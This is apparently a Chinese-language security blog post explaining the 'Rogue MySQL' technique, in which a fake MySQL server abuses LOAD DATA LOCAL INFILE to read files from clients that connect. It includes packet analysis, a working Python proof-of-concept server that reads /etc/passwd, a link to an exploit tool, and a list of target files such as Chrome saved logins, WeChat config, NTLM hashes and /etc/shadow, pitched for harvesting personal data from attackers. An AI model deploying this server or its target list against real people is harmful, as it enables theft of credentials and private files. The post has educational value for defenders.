---
layout: post
title: RougeMysql任意读取用户文件
---



> **“** Mysql任意读取客户端文件已经早在17年就已经有人提起过，放在今天来看，可以用做蜜罐来获取攻击者的个人信息文件，也可以用在AWD中，比如可以获取攻击者QQ号，聊天记录，微信id，NTMLHash等，此文只做为引子介绍Rouge-Mysql攻击过程 **”**

[TOC]

## 01 数据包分析

在开始之前，我们首先要了解一个命令

 `load data local infile '/etc/passwd' into table users fields terminated by '\n';`

上面这句命令的意思解释一下就是 导入一个本地文件 `etc/passwd` 至 `user`表中，导入数据以` \n`换行符分割

![img](https://s1.ax1x.com/2020/09/12/wagZo8.md.png)

PS：

**Mysql >8.0** 版本的是默认禁止了 **local_infile** 功能 ，所以需要手动开启

`set global local_infile = 1;`

![img](https://s1.ax1x.com/2020/09/12/wagkLt.md.png)

运行 `load data` 命令查看数据包

![img](https://s1.ax1x.com/2020/09/12/wagVdf.md.jpg)

![img](https://s1.ax1x.com/2020/09/12/wagEeP.md.png)

test文件内容

![img](https://s1.ax1x.com/2020/09/12/wagFsI.md.png)



上面就是完整的 `load data` 命令数据包

下面我们重点看一下 请求读取文件的这个数据包

![img](https://s1.ax1x.com/2020/09/12/wagmFS.md.jpg)



- 红框内容 `1c`：文件绝对路径长度+1 （16进制）
- 蓝框内容 `00 00 01`：数据包序号
- 绿框内容 `fb`：数据包类型

可以看到我们只需要获取到 **文件名+绝对路径的长度+1** 再加上要读的文件绝对路径基本就可以实现读取任意文件，简单构造一下数据包：

(文件绝对路径长度+1) `00 00 01 fb` (文件绝对路径)

```python
chr(len(filename) + 1) + "\x00\x00\x01\xFB" + filename 
```



## 02伪造 **Mysql**客户端

想要伪造一个Mysql客户端，我们先启动一个正常的 Mysql 服务，正常的过一遍连接到认证成功的流程。

Mysql 先是发送一个 `Greeting Proto` 的欢迎包

![img](https://s1.ax1x.com/2020/09/12/wagKzj.md.png)

紧接着就是认证流程数据包，Mysql 收到客户端发来的账号密码 进行验证并返回相应的数据包

![img](https://s1.ax1x.com/2020/09/12/wagQQs.md.png)





Mysql 返回对应的认证包

![img](https://s1.ax1x.com/2020/09/12/waglyn.md.png)





至此就是 Mysql 的认证流程，知道了流程以后，我们就可以伪造 Mysql 客户端：

1. 监听 3306 端口，发送伪造的 Mysql 欢迎数据包
2. 有人连接则发送 Mysql 认证成功的数据包。
3. 伪造 Mysql 读取文件的数据包。
4. 根据数据包特征判断是否读取成功，成功则获取数据包内容。



## 03 Poc演示

Poc：

```python
import socket
import os
import sys

#usage poc.py 3306

port = int(sys.argv[1])
sv=socket.socket()
sv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sv.bind(("",port))
sv.listen(5)
print "Listen Begin in port "+ str(port)

filename = "/etc/passwd"conn, address = sv.accept()
conn.sendall("\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00")
conn.recv(9999)
conn.sendall("\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00")
conn.recv(9999)
wantfile=chr(len(filename)+1)+"\x00\x00\x01\xFB"+filename
conn.sendall(wantfile)
content=conn.recv(9999)
conn.close()

if len(content) > 4:    
	print("[*] Read %s Successful!" % (filename))
```



本地运行 poc.py

![img](https://s1.ax1x.com/2020/09/12/wag1Lq.md.png)

端口也正在监听中

![img](https://s1.ax1x.com/2020/09/12/wag8e0.md.png)



尝试弱口令连接 Mysql

![img](https://s1.ax1x.com/2020/09/12/wagGwV.md.png)



读取文件成功，同时看一下数据包

![img](https://s1.ax1x.com/2020/09/12/wagNYF.md.png)

可见 **/etc/passwd** 已经读取成功，所有的数据包也都伪造成功

下面要做的就是根据流量特征利用正则提取文件内容即可。



获取工具

git clone https://github.com/ev0A/Mysqlist

dicc.txt 是要读的文件

![img](https://s1.ax1x.com/2020/09/12/waf4C8.md.png)

运行 exp_dicc.py端口 3306

![img](https://s1.ax1x.com/2020/09/12/wafNH1.md.png)

尝试在Windows主机连接伪造的 Mysql服务，密码随便写

![img](https://s1.ax1x.com/2020/09/12/wafw4K.md.png)



成功读取到用户文件

![img](https://s1.ax1x.com/2020/09/12/wafNH1.md.png)

查看读取的文件

![img](https://s1.ax1x.com/2020/09/12/waftBR.md.png)



截止以上就是完整的伪造攻击流程。



## 04 思考🤔

既然可以任意读取文件，除了/etc/passwd 还有什么其他很有价值的文件呢？

**e.g:**

1. chrom login data 

   `'C:/Users/' + username + '/AppData/Local/Google/Chrome/User Data/Default/Login Data'`

2. NTLM Hash（Bettercap + responder）

3. 微信ID

   `C:\Users\username\Documents\WeChat Files\All Users\config\config.data`

4. `/etc/shadow` 等



**一些问题**

1. 添加判断，若客户端没有进行认证则不需要发送认证成功的数据包



Reference：

[3] https://github.com/ev0A/ArbitraryFileReadList

[4] https://github.com/ev0A/Mysqlist

[5] https://mp.weixin.qq.com/s/m4I_YDn98K_A2yGAhv67Gg

<img src="https://s1.ax1x.com/2020/09/12/wafYu9.md.gif" alt="img" style="zoom:80%;" />

